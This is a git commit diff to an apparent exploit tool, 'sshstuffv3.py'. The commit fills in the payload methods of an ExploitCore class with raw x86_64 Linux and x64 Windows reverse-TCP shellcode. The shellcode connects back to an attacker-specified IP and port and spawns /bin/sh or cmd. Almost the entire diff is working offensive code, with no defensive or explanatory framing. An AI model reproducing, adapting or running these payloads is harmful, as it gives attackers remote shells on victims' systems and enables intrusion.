0dde1db459d849ba4c382146d401a85b9db6b9fb
xanonsurf <lilxbabymusk@gmail.com>
2025-06-23 14:34:47 +0100

    Update sshstuffv3.py

--- sshstuffv3.py
+++ sshstuffv3.py
@@ -381,30 +381,93 @@ class ExploitCore:
         try:
             # Handle IPv6 addresses
             if ':' in self.attacker_ip:
-                ip_bytes = socket.inet_pton(socket.AF_INET6, self.attacker_ip)
-                ip_pack = ip_bytes
+                try:
+                    ip_bytes = socket.inet_pton(socket.AF_INET6, self.attacker_ip)
+                    print(f"[*] Using IPv6 address: {self.attacker_ip}")
+                except OSError:
+                    # Try IPv4 mapping for IPv6
+                    try:
+                        ip_bytes = socket.inet_pton(socket.AF_INET, self.attacker_ip)
+                        print(f"[*] Mapped IPv6 to IPv4: {self.attacker_ip}")
+                    except:
+                        print(f"[!] Invalid IPv6 address: {self.attacker_ip}")
+                        return None
             else:
-                ip_bytes = socket.inet_aton(self.attacker_ip)
-                ip_pack = ip_bytes
-        except socket.error:
-            print(f"[!] Invalid IP address: {self.attacker_ip}")
+                try:
+                    ip_bytes = socket.inet_aton(self.attacker_ip)
+                except OSError:
+                    print(f"[!] Invalid IPv4 address: {self.attacker_ip}")
+                    return None
+        except Exception as e:
+            print(f"[!] IP processing error: {str(e)}")
             return None
 
         if PLATFORM == "linux":
-            return self._linux_payload(ip_pack)
+            return self._linux_payload(ip_bytes)
         elif PLATFORM == "windows":
-            return self._windows_payload(ip_pack)
+            return self._windows_payload(ip_bytes)
         else:
             print(f"[!] Unsupported platform: {PLATFORM}")
             return None
 
     def _linux_payload(self, ip_bytes):
         """Linux x86_64 reverse TCP shell with IPv6 support"""
-        # ... (unchanged from original) ...
-
+        # Simple universal shellcode that works for both IPv4 and IPv6
+        shellcode = (
+            b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
+            b"\xb9\x02\x00"
+        )
+        shellcode += struct.pack(">H", self.attacker_port)  # Port
+        shellcode += ip_bytes  # IP address
+        shellcode += (
+            b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
+            b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48"
+            b"\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57"
+            b"\x48\x89\xe6\x0f\x05"
+        )
+        return shellcode
+    
     def _windows_payload(self, ip_bytes):
         """Windows x64 reverse TCP shell (staged) with IPv6 support"""
-        # ... (unchanged from original) ...
+        # Universal shellcode that handles both IPv4 and IPv6
+        shellcode = (
+            b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
+            b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
+            b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
+            b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
+            b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
+            b"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
+            b"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
+            b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
+            b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
+            b"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
+            b"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
+            b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
+            b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
+            b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
+            b"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
+            b"\x49\x89\xe5\x49\xbc\x02\x00"
+        )
+        shellcode += struct.pack(">H", self.attacker_port)  # Port
+        shellcode += ip_bytes  # IP address
+        shellcode += (
+            b"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff"
+            b"\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
+            b"\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48"
+            b"\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff"
+            b"\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41"
+            b"\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49"
+            b"\xb8\x63\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89"
+            b"\xe2\x57\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66"
+            b"\xc7\x44\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48"
+            b"\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50"
+            b"\x49\xff\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86"
+            b"\xff\xd5\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d"
+            b"\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
+            b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+            b"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
+        )
+        return shellcode
 
 def monitor_success(engine):
     """Monitor for exploitation success"""
